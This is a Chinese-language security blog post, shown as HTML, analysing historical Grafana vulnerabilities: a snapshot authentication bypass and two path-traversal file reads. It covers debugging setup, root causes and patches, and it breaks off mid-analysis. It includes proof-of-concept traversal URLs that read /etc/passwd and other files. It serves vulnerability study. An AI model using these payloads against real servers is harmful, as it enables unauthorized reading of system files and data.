class="nav-text">CVE-2022-31107（OAuth 账号接管）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-9"><span class="nav-number">11.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-9"><span class="nav-number">11.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6"><span class="nav-number">11.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-9"><span class="nav-number">11.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="淚笑"
+      src="/resources/avatar.jpg">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/resources/avatar.jpg">
+      <meta itemprop="name" content="淚笑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+      <meta itemprop="description" content="学的越多，懂的越少">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Grafana 历史漏洞分析 | l3yx's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Grafana 历史漏洞分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-08-06 16:31:15" itemprop="dateCreated datePublished" datetime="2023-08-06T16:31:15+08:00">2023-08-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-26 16:12:02" itemprop="dateModified" datetime="2024-10-26T16:12:02+08:00">2024-10-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>最近学了下Go，也准备挖一下Go WEB应用的漏洞。梳理了Grafana的结构，调试分析了Grafana的一些历史漏洞及修复方案，也在分析过程中挖到了新的。感觉Go语言确实是比较安全的，很多漏洞其实都是代码逻辑上的问题</p>
+<span id="more"></span>
+
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
+<li><p>Grafana的Web框架<a target="_blank" rel="noopener" href="https://go-macaron.com/zh-cn/starter_guide">Macaron</a></p>
+</li>
+<li><p>Grafana的ORM框架<a target="_blank" rel="noopener" href="https://xorm.io/zh/docs/">XORM</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5MDM5NTY0OA==&mid=2648697189&idx=1&sn=e8dc4553defe6761599d2993b67653bc&chksm=be6e350a8919bc1cf84f5dfb123c65e77f07393f2a579b5e4a3aec1360e5a2e788722936cc1b&scene=178&cur_album_id=1572881544908701700#rd">Grafana的主体架构</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xumc.github.io/blog/2018/07/25/grafana-inside">grafana http部分源码解析</a></p>
+</li>
+</ul>
+<h2 id="CVE-2021-39226（快照验证绕过）"><a href="#CVE-2021-39226（快照验证绕过）" class="headerlink" title="CVE-2021-39226（快照验证绕过）"></a>CVE-2021-39226（快照验证绕过）</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>:  &lt;&#x3D; 8.1.5</p>
+<p><strong>Patched versions</strong>:  7.5.11, 8.1.6</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>下载指定版本：<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/archive/refs/tags/v8.1.0.zip">https://github.com/grafana/grafana/archive/refs/tags/v8.1.0.zip</a></p>
+<p>修改build.go中的编译参数用于远程调试，且需要<a target="_blank" rel="noopener" href="https://juejin.cn/post/7004731872735395877#heading-2">删除-ldflags中的-w参数</a></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//args := []string&#123;&quot;build&quot;, &quot;-ldflags&quot;, ldflags()&#125;</span></span><br><span class="line">args := []<span class="type">string</span>&#123;<span class="string">&quot;build&quot;</span>, <span class="string">&quot;-ldflags&quot;</span>, ldflags(), <span class="string">&quot;-gcflags&quot;</span>, <span class="string">&quot;all=-N -l&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//b.WriteString(&quot;-w&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p>修改packaging&#x2F;docker&#x2F;run.sh以Delve启动应用</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exec grafana-server                                         \</span></span><br><span class="line"><span class="built_in">exec</span> dlv --listen=:2345 --headless=<span class="literal">true</span> --api-version=2 --accept-multiclient <span class="built_in">exec</span> /usr/share/grafana/bin/grafana-server --<span class="built_in">continue</span> -- \</span><br></pre></td></tr></table></figure>
+
+<p>修改Dockerfile中的<code>Final stage</code>以安装Delve</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Final stage</span></span><br><span class="line"><span class="comment">#FROM alpine:3.13</span></span><br><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.16</span>.<span class="number">1</span>-alpine3.<span class="number">13</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">export</span> GOPROXY=<span class="string">&quot;https://goproxy.cn&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    go install github.com/go-delve/delve/cmd/dlv@v1.7.3</span></span><br></pre></td></tr></table></figure>
+
+<p>然后构建镜像并启动</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t grafana_debug:8.1.0</span><br><span class="line">docker run --<span class="built_in">rm</span> -d -p3000:3000 -p2345:2345 grafana_debug:8.1.0</span><br></pre></td></tr></table></figure>
+
+<p>用GoLand连接远程调试即可</p>
+<blockquote>
+<p>如果<code>go-builder</code>阶段构建镜像的时候有网络环境问题，可以设置一下GOPROXY</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENV</span> GOPROXY=<span class="string">&quot;https://goproxy.cn&quot;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>登录Grafana，点击左侧<code>Create Dashboard</code>，随便添加一些panel然后保存，然后点击左上角的分享图标<code>Share dashboard or panel</code>，选择Snapshot，点击按钮<code>Local Snapshot</code>，这会生成一个快照和类似这样的分享链接：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:3000/dashboard/snapshot/9EI8uXd32QUJqF3dS34EeIz3fkKsRkZB">http://localhost:3000/dashboard/snapshot/9EI8uXd32QUJqF3dS34EeIz3fkKsRkZB</a></p>
+<p>这个url无需身份验证就可以访问。</p>
+<p>漏洞存在于如下url，即不需要知道快照的key且无需身份验证即可获取快照信息：</p>
+<ul>
+<li><code>/api/snapshots/:key</code></li>
+<li><code>/api/snapshots-delete/:deleteKey</code> (snapshot “public_mode” configuration setting is set to true)</li>
+<li><code>/dashboard/snapshot/:key</code></li>
+</ul>
+<p>其中<code>/dashboard/snapshot/:key</code>只是个前端页面，本质还是会调用<code>/api/snapshots/:key</code>接口获取快照数据</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808205929971.png" alt="image-20230808205929971"></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808210006793.png" alt="image-20230808210006793"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>路由在pkg&#x2F;api&#x2F;api.go中定义：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.Get(<span class="string">&quot;/dashboard/snapshot/*&quot;</span>, reqNoAuth, hs.Index)</span><br><span class="line">...</span><br><span class="line">r.Get(<span class="string">&quot;/api/snapshots/:key&quot;</span>, routing.Wrap(GetDashboardSnapshot))</span><br><span class="line">r.Get(<span class="string">&quot;/api/snapshots-delete/:deleteKey&quot;</span>, reqSnapshotPublicModeOrSignedIn, routing.Wrap(DeleteDashboardSnapshotByDeleteKey))</span><br></pre></td></tr></table></figure>
+
+<p>以上路由都是不需要身份验证的，但<code>/api/snapshots-delete/:deleteKey</code>需要SnapshotPublicMode这项配置为True，见pkg&#x2F;middleware&#x2F;auth.go:151：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SnapshotPublicModeOrSignedIn</span><span class="params">(cfg *setting.Cfg)</span></span> macaron.Handler &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *models.ReqContext)</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> cfg.SnapshotPublicMode &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> !c.IsSignedIn &#123;</span><br><span class="line">			notAuthorized(c)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在Macaron中，<code>/api/snapshots/:key</code> 中的<code>:key</code>是一个<a target="_blank" rel="noopener" href="https://go-macaron.com/zh-cn/middlewares/routing#zhan-wei-fu">占位符</a>，可以理解为把url路径中的一部分作为参数，这里有个有趣的特性，如下代码：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;gopkg.in/macaron.v1&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	m := macaron.Classic()</span><br><span class="line">	m.Get(<span class="string">&quot;/hello/:name&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx *macaron.Context)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">		name := ctx.Params(<span class="string">&quot;:name&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%T,%d,%s&quot;</span>, name, <span class="built_in">len</span>(name), name)</span><br><span class="line">	&#125;)</span><br><span class="line">	m.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不向占位符的地方传入数据或者传入和占位符完全一样的字符串，那么得到的参数就会是空字符串，例如访问这两个路径：<code>/hello//</code>、<code>/hello/:name</code>，那么得到的结果都是<code>string,0,</code>。</p>
+<p>回到Grafana的代码中，<code>/api/snapshots/:key</code>路由对应的具体逻辑在<code>pkg/api/dashboard_snapshot.go:147</code>，而<code>:key</code>的本意是快照的key，此时为空字符串</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808225317771.png" alt="image-20230808225317771"></p>
+<p><code>bus.Dispatch(query)</code>是Grafana中的<a target="_blank" rel="noopener" href="https://xumc.github.io/blog/2018/07/25/grafana-inside">bus机制</a>，跳过这里，直接到获取快照的具体逻辑：<code>pkg/services/sqlstore/dashboard_snapshot.go:90</code></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808230801960.png" alt="image-20230808230801960"></p>
+<p>其中<code>x</code>是定义于<code>pkg/services/sqlstore/sqlstore.go:32</code>的全局变量，为XORM Engine。</p>
+<p>XORM的<a target="_blank" rel="noopener" href="https://xorm.io/zh/docs/chapter-05/3.get/">Get方法</a>的其中一个用法如下：</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809000602775.png" alt="image-20230809000602775"></p>
+<p>根据”已有的非空数据”来获取单条数据，如果数据都为空呢，测试发现会返回数据表的第一条数据，而如果数据为0，空字符串这种情况，也等同于空，例如下代码：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	_ <span class="string">&quot;github.com/mattn/go-sqlite3&quot;</span></span><br><span class="line">	<span class="string">&quot;xorm.io/xorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id   <span class="type">int64</span></span><br><span class="line">	Name <span class="type">string</span> <span class="string">`xorm:&quot;varchar(25)&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> engine *xorm.Engine</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initData</span><span class="params">()</span></span> &#123;</span><br><span class="line">	engine.CreateTables(<span class="built_in">new</span>(User))</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">		user := <span class="built_in">new</span>(User)</span><br><span class="line">		user.Name = <span class="string">&quot;leixiao&quot;</span></span><br><span class="line">		engine.Insert(user)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getData</span><span class="params">(id <span class="type">int64</span>, name <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	user := &amp;User&#123;Id: id, Name: name&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Query : %+v\n&quot;</span>, user)</span><br><span class="line">	has, _ := engine.Get(user)</span><br><span class="line">	<span class="keyword">if</span> has &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Result: %+v\n&quot;</span>, user)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Result: nil\n&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDataEmpty</span><span class="params">()</span></span> &#123;</span><br><span class="line">	user := &amp;User&#123;&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Query : %+v\n&quot;</span>, user)</span><br><span class="line">	has, _ := engine.Get(user)</span><br><span class="line">	<span class="keyword">if</span> has &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Result: %+v\n&quot;</span>, user)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Result: nil\n&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	engine, err = xorm.NewEngine(<span class="string">&quot;sqlite3&quot;</span>, <span class="string">&quot;./test.db&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	initData()</span><br><span class="line"></span><br><span class="line">	getDataEmpty()</span><br><span class="line">	fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	getData(<span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回结果将为：</p>
+<blockquote>
+<p>Query : &amp;{Id:0 Name:}<br>Result: &amp;{Id:1 Name:leixiao}</p>
+<p>Query : &amp;{Id:0 Name:}<br>Result: &amp;{Id:1 Name:leixiao}</p>
+</blockquote>
+<p>所以，当这里的<code>Key</code>和<code>DeleteKey</code>都为空字符串时，最终查询结果为数据表的第一条数据</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809001253404.png" alt="image-20230809001253404"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>8.1.6修复方案如下：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/commit/2d456a6375855364d098ede379438bf7f0667269">https://github.com/grafana/grafana/commit/2d456a6375855364d098ede379438bf7f0667269</a></p>
+<p>主要是修复了两处，第一处修复相当于给Macaron打了个补丁，修复了前文提到的如果向占位符的地方传入和占位符完全一样的字符串，那么得到的参数就会是空字符串的问题</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809095608186.png" alt="image-20230809095608186"></p>
+<p>但是这里是可以绕过的，也是前文提到的传入空数据，我搭了8.1.6的调试环境，测试结果如下：</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809100109265.png" alt="image-20230809100109265"></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809100041876.png" alt="image-20230809100041876"></p>
+<p>另一处修复是检查<code>key</code>参数长度是否为0，也就是判断是否为空字符串，这里就几乎杜绝了绕过的可能</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809100415312.png" alt="image-20230809100415312"></p>
+<h2 id="CVE-2021-43798（路径穿越任意文件读取）"><a href="#CVE-2021-43798（路径穿越任意文件读取）" class="headerlink" title="CVE-2021-43798（路径穿越任意文件读取）"></a>CVE-2021-43798（路径穿越任意文件读取）</h2><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: 8.0.0 - 8.3.0</p>
+<p><strong>Patched versions</strong>: 8.3.1, 8.2.7, 8.1.8, 8.0.7</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>依然使用8.1.0的版本，POC里将url路径中的<code>/</code>url编码是为了防止浏览器自动进行URL路径规范化</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:3000/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd">http://127.0.0.1:3000/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd</a></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809114013245.png" alt="image-20230809114013245"></p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>路由在pkg&#x2F;api&#x2F;api.go中定义：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.Get(<span class="string">&quot;/public/plugins/:pluginId/*&quot;</span>, hs.GetPluginAssets)</span><br></pre></td></tr></table></figure>
+
+<p>这里看出这是个前台漏洞，也就是不需要身份验证的。</p>
+<p>路由对应的具体逻辑在：pkg&#x2F;api&#x2F;plugins.go:260</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809115705806.png" alt="image-20230809115705806"></p>
+<p>逻辑很简单，就是参数<code>c.Params(&quot;*&quot;)</code>被拼接到文件路径，然后响应返回文件内容。问题在于参数中的”..&#x2F;“并没有被正确过滤从而导致了路径穿越，而为什么<code>filepath.Clean</code>函数没有处理”..&#x2F;“，可以看官方文档对<a target="_blank" rel="noopener" href="https://pkg.go.dev/path/filepath#Clean">该函数的解释</a>，简单来说就是路径以<code>/</code>开头才会处理”..&#x2F;“</p>
+<p>例如下代码：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(filepath.Clean(<span class="string">&quot;/xxx/../etc/passwd&quot;</span>))</span><br><span class="line">	fmt.Println(filepath.Clean(<span class="string">&quot;../etc/passwd&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果为:</p>
+<blockquote>
+<p>&#x2F;etc&#x2F;passwd<br>..&#x2F;etc&#x2F;passwd</p>
+</blockquote>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce">https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce</a></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809123351013.png" alt="image-20230809123351013"></p>
+<p>首先是给路径参数前面拼接了<code>/</code>，然后再通过<code>filepath.Clean</code>函数处理，这样也基本就解决了路径穿越的问题。然后通过<code>filepath.Rel</code>函数获取路径相当于<code>/</code>的相对路径，最后拿相对路径和PluginDir进行路径拼接，这样最终的文件路径就只能是PluginDir下的文件</p>
+<h2 id="CVE-2021-43813（路径穿越-md文件读取）"><a href="#CVE-2021-43813（路径穿越-md文件读取）" class="headerlink" title="CVE-2021-43813（路径穿越.md文件读取）"></a>CVE-2021-43813（路径穿越.md文件读取）</h2><h3 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: 5.0.0 - 8.3.1</p>
+<p><strong>Patched versions</strong>: 8.3.2, 7.5.12</p>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用8.1.0或8.3.1的版本，先进入容器，创建除了后缀名，路径分别为全大写和全小写的md文件</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /lower; echo lower &gt; /lower/file.md</span><br><span class="line">mkdir /UPPER; echo upper &gt; /UPPER/FILE.md</span><br></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:3000/api/plugins/text/markdown/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fupper%2ffile">http://127.0.0.1:3000/api/plugins/text/markdown/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fupper%2ffile</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:3000/api/plugins/text/markdown/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2flower%2ffile">http://127.0.0.1:3000/api/plugins/text/markdown/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2flower%2ffile</a></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809140928365.png" alt="image-20230809140928365"></p>
+<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="8-1-0"><a href="#8-1-0" class="headerlink" title="8.1.0"></a>8.1.0</h4><p>路由在pkg&#x2F;api&#x2F;api.go中定义：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.Group(<span class="string">&quot;/api&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(apiRoute routing.RouteRegister)</span></span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  apiRoute.Get(<span class="string">&quot;/plugins/:pluginId/markdown/:name&quot;</span>, routing.Wrap(hs.GetPluginMarkdown))</span><br><span class="line">  ...</span><br><span class="line">&#125;, reqSignedIn)</span><br></pre></td></tr></table></figure>
